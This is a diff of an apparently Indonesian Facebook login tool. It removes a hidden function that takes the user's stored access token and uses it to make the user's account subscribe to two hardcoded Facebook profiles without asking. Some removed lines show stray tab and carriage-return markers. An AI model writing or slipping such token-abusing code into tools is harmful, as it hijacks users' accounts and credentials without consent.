@@ -172,24 +172,6 @@ def login():
     else:
         exit(' *! Isi Dengan Benar')
 
-###BOT FOLLOW##
-
-def bot_follow():
-	try:
-		toket=open("login.txt","r").read()
-		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
-		a = json.loads(otw.text)
-		nama = a["name"]
-		id = a["id"]
-	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
-		logs()
-          -----><------>logs()^M
------>jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))^M
------>requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Aditya Gremory 2006:")^M
------>requests.post("https://graph.facebook.com/100026568911671/subscribers?access_token=" + toket) # Dapunta Ratya^M
-      menu()
-##### MENU #####
 def menu():
   try:
     toket = open('login.txt','r').read()
